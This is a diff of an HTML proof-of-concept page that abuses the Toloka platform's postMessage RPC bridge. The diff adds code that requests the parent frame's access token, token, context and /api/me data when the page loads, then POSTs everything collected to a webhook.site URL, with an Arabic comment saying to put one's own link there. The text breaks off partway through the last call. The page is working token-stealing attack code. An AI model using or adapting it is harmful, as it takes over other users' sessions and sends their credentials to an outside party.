@@ -1,44 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>PoC - Toloka RPC Exploit</title>
+  <meta charset="UTF-8" />
+  <title>🧪 PoC - Toloka RPC Leak</title>
   <style>
     body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
     pre { white-space: pre-wrap; word-break: break-word; }
   </style>
 </head>
 <body>
-  <h2>✅ Toloka RPC PoC</h2>
-  <pre id="log">[⏳] Waiting for RPC responses...</pre>
+  <h2>📡 Toloka RPC PoC</h2>
+  <pre id="log">⏳ Running tests...</pre>
 
   <script>
     const logEl = document.getElementById('log');
+    const webhookURL = 'https://webhook.site/2106b9ef-aafe-498c-b8e0-bef7c35b92f3'; // ← ضع رابطك هنا
+
+    const collected = {};
+
     const log = (...args) => {
       const text = args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' ');
       logEl.textContent += '\n' + text;
       console.log(...args);
     };
 
-    function callRPC(name, payload = {}) {
+    function callRPC(method, payload = {}) {
       const id = crypto.randomUUID();
+
       window.addEventListener('message', function handler(e) {
         if (e.origin !== 'https://tb.toloka.dev') return;
-        if (e.data?.type === 'rpc' && e.data.id === id) {
-          log(`[✅ ${name} Response from parent]`, e.data.payload);
+        if (e.data?.id === id && e.data?.type === 'rpc') {
+          log(`✅ [${method}] response:`, e.data.payload);
+          collected[method] = e.data.payload;
           window.removeEventListener('message', handler);
+
+          // إذا جمعنا كل القيم نرسلها إلى Webhook
+          if (Object.keys(collected).length === 4) {
+            fetch(webhookURL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                time: new Date().toISOString(),
+                data: collected
+              })
+            }).then(() => log('📤 Sent to webhook ✅')).catch(e => log('❌ Webhook error:', e));
+          }
         }
       });
-      const msg = { type: 'rpc', id, name, payload };
-      window.parent.postMessage(msg, '*');
-      log(`[📤] Sent "${name}" with id ${id}`, msg);
+
+      window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');
+      log(`📤 Sent ${method} with id ${id}`);
     }
 
-    // عند تحميل الصفحة، نفذ RPC
     window.onload = () => {
-      callRPC('getAccessToken');
-      callRPC('getToken');
-      callRPC('getContext');
+      ['getAccessToken', 'getToken', 'getContext'].forEach(callRPC);
       callRPC('fetch', {
         url: '/api/me',
         requestInit: { method: 'GET' }
